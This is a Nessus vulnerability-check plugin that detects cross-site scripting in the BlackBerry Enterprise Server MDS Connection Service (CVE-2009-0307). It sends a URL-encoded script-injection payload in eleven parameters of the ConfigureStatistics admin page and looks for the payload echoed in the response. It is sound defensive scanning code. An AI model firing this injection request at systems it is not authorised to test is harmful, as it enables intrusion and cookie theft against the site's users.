#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(38199);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2009-0307");
  script_bugtraq_id(34573);
  script_xref(name:"OSVDB", value:"53772");
  script_xref(name:"Secunia", value:"34740");

  script_name(english:"BlackBerry Enterprise Server MDS Connection Service XSS");
  script_summary(english:"Tries to inject XSS using multiple parameters in BlackBerry Enterprise Server MDS Connection Service");

 script_set_attribute(attribute:"synopsis", value:
"The remote Windows application is affected by cross-site scripting
vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the BlackBerry Enterprise Server MDS
Connection Service.  The installed version is affected by cross-site
scripting vulnerabilities involving the 'customDate', 'interval',
'lastCustomInterval', 'lastIntervalLength', 'nextCustomInterval',
'nextIntervalLength', 'action', 'delIntervalIndex', 'addStatIndex',
'delStatIndex', and 'referenceTime' parameters of the
'admin/statistics/ConfigureStatistics' script.  An attacker can
leverage these in order to execute arbitrary script code or steal
cookie-based authentication credentials." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6c35d150" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/502746/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to BlackBerry Enterprise Server 4.1.6 MR5 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );

 script_end_attributes();

  script_category(ACT_GATHER_INFO);

  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl",
  "blackberry_es_installed.nasl");

  exit(0);
}

include("http.inc");
include("misc_func.inc");
include("global_settings.inc");

port = get_http_port(default:8080, embedded: 0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);

postdata = string(
  "customDate=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "interval=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "lastCustomInterval=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "lastIntervalLength=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "nextCustomInterval=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "nextIntervalLength=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "action=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "delIntervalIndex=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "addStatIndex=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "delStatIndex=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E&",
  "referenceTime=%3E%22%27%3E%3Cscript%3Ealert%28%22nessus%22%29%3C%2Fscript%3E"
);

exploit_res = string(
  '>"', "'", '><script>alert("nessus")</script>');

res = http_send_recv3(port:port, item:"/admin/statistics/ConfigureStatistics", method:"GET");
if (isnull(res)) exit(0);

if ("BlackBerry&#xAE; Mobile Data Service Connection Service" >< res[2] &&
    "Page generated by MDS-CS" >< res[2])
{
  req = http_mk_post_req(
    port        : port,
    item        : "/admin/statistics/ConfigureStatistics",
    add_headers : make_array("Content-Type", "application/x-www-form-urlencoded"),
    data        : postdata
  );
 
  res = http_send_recv_req(port:port, req:req);
  if (isnull(res)) exit(0);
  
  # There's a problem if we see our exploit in the result
  if ("invalid action specified:" >< res[2] &&
      exploit_res >< res[2])
  {
    if (report_verbosity>0)
    {
      req_str = http_mk_buffer_from_req(req:req);
  
      report = string(
        "\n",
        "Nessus was able to exploit this issue using the following request : \n",
        "\n",
        "  ", str_replace(find:'\n', replace:'\n  ', string:req_str), "\n",
        "\n"
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    set_kb_item(name:'www/'+port+'XSS', value:TRUE);
  }
}
